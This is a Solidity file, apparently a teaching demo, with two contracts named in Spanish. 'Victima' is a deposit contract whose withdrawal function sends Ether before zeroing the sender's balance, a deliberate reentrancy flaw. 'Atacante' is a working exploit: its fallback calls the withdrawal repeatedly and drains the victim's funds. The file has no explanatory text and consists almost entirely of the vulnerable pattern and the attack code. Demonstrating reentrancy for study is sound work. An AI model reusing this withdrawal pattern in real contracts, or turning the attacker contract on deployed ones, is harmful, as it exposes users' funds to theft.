// SPDX-License-Identifier: MIT

pragma solidity >=0.4.22 <0.9.0;

contract Victima {
    mapping(address => uint) public saldos;

    function deposito() external payable{
        saldos[msg.sender] += msg.value;
    }

    function retiroDeDinero() external {
        uint saldoPersonal = saldos[msg.sender];
        require(saldoPersonal > 0, "Tu saldo es cero.");
        (bool devolverDineroAlPropietario, ) = msg.sender.call {value: saldoPersonal}("");
        require(devolverDineroAlPropietario, "No se pudo devolver el dinero.");
        saldos[msg.sender] = 0;
    }

    function getSaldo() public view returns (uint){
        return address(this).balance;
    }

    fallback() external payable{

    }
}

contract Atacante{

    Victima victimaContrato;
    constructor(Victima _victimaContrato) {
        victimaContrato = Victima(_victimaContrato);
    }

    function getSaldo() public view returns (uint){
        return address(this).balance;
    }

    function depositoDelAtacante() external payable {
        require(msg.value >= 1 ether, "<1 eth");
        victimaContrato.deposito{value: 1 ether}();
    }

    function retiroDelAtacante() external {
       victimaContrato.retiroDeDinero();
    }

    function ataque() external payable {
        require(msg.value >= 1 ether, "<1 eth");
        victimaContrato.deposito{value: 1 ether}();
        victimaContrato.retiroDeDinero();
    }

    fallback() external payable {
        uint saldoVictima = address(victimaContrato).balance;
        if(saldoVictima > 0) {
            victimaContrato.retiroDeDinero();
        }
    }
}